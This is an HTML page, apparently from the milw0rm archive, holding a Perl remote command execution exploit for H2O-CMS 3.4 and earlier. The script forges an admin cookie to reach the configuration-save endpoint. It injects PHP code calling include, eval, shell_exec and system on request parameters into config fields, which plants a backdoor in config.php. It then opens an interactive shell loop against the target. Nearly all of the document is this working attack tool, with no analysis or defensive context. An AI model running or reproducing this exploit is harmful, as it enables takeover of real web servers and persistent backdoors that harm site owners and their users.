<html><head><title>H2O-CMS <= 3.4 Remote Command Execution Exploit (mq = off)</title></head><pre>#!/usr/bin/perl 
# ---------------------------------------------------------- 
# H2O-CMS &lt;= 3.4 Remote Command Execution Exploit (mq = Off)
# Discovered By StAkeR[at]hotmail[dot]it
# Download On http://sourceforge.net/projects/h2o-cms
# ---------------------------------------------------------- 

use strict;
use LWP::UserAgent;
use LWP::Simple;

my $post;
my $sysc;
my $host = shift or athos();
my $auth = &quot;user=admin&amp;id=1&amp;admin=1&quot;;
my $http = new LWP::UserAgent;

my $write = {
              'site_title'  =&gt; '&quot;;&quot;&quot;; error_reporting(0); echo&quot;//athos&quot;; &quot;',
              'db_server'   =&gt; '&quot;;&quot;&quot;; include($_REQUEST[&quot;i&quot;]); &quot;',
              'db_name'     =&gt; '&quot;;&quot;&quot;; eval($_REQUEST[&quot;g&quot;]); &quot;',
              'db_username' =&gt; '&quot;;&quot;&quot;; echo shell_exec($_REQUEST[&quot;c&quot;]); &quot;',
              'db_password' =&gt; '&quot;;&quot;&quot;; echo system($_REQUEST[&quot;s&quot;]); &quot;',
              'save'        =&gt; 'Save',
            };


$http-&gt;default_header('Cookie' =&gt; $auth);
$post = $http-&gt;post($host.'/index.php?option=SaveConfig',$write);

    
sub start_exec
{  
   my $site = shift @_;
   my $exec = shift @_;
   my $view = get($site.'/includes/config.php?c='.$exec);
   
   return $view;
}   

sub athos
{
   print STDOUT &quot;# Usage: perl $0 http://[host]\n&quot;;
   print STDOUT &quot;# Remote Command Execution Exploit\n&quot;;
   exit;
}

unless(get($host) =~ /\/\/athos/i)
{
   print STDOUT &quot;# Exploit Failed!\n&quot;;
   exit;
}
else
{
  while(1)
  {
     if(defined start_exec($host,$sysc))
     {
        print STDOUT &quot;[athos-shell] ~# &quot;; 
        chomp($sysc = &lt;STDIN&gt;);
      
        print STDOUT &quot;[athos-shell] ~# &quot;.start_exec($host,$sysc).&quot;\n&quot;;
     }             
  }
}

__END__

# milw0rm.com [2008-10-28]</pre></html>